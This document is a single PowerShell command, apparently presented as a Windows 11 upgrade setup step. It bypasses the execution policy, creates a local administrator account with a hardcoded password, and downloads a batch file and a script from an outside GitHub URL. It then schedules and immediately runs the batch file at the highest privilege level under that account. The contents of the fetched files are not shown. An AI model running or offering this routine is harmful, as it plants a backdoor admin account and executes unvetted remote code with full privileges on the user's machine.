powershell -ExecutionPolicy Bypass -NoProfile -Command "$user='WinUpgTemp';$pass='TempPass123!';$root='C:\Win11Upgrade';$urlbat='https://raw.githubusercontent.com/sctcoder1/project-711-d/main/RepoHandler.bat';$urlps1='https://raw.githubusercontent.com/sctcoder1/project-711-d/main/RepoHandler.ps1';$bat=Join-Path $root 'RepoHandler.bat';$ps1=Join-Path $root 'RepoHandler.ps1';$log=Join-Path $root 'Setup_Log.txt';function log($m){$t='['+(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')+'] '+$m;New-Item -ItemType Directory -Force -Path (Split-Path $log)|Out-Null;Add-Content -Path $log -Value $t;Write-Host $t};log '--- Starting RepoHandler setup ---';if(-not(Test-Path $root)){New-Item -ItemType Directory -Force -Path $root|Out-Null};net user $user $pass /add | Out-Null;net localgroup administrators $user /add | Out-Null;log ('Created/ensured admin user '+$user);Invoke-WebRequest -Uri $urlbat -OutFile $bat -UseBasicParsing;Invoke-WebRequest -Uri $urlps1 -OutFile $ps1 -UseBasicParsing;log 'Downloaded RepoHandler files';if(Test-Path $bat){schtasks /delete /tn RepoHandler /f 2>$null;log 'Creating task to run RepoHandler under '+$user; $tr='cmd /c \"'+$bat+'\"';$out=schtasks /create /tn RepoHandler /tr $tr /sc once /st 23:59 /RL HIGHEST /RU $user /RP $pass /F 2>&1;log ('schtasks /create output: '+$out);if($LASTEXITCODE -eq 0){log 'Running RepoHandler task now...';$out2=schtasks /run /tn RepoHandler 2>&1;log ('schtasks /run output: '+$out2);Start-Sleep -Seconds 10;log 'RepoHandler started successfully under '+$user;}else{log ('ERROR: Task creation failed code '+$LASTEXITCODE)}}else{log ('ERROR: Missing file '+$bat)};log '--- Script complete ---'"
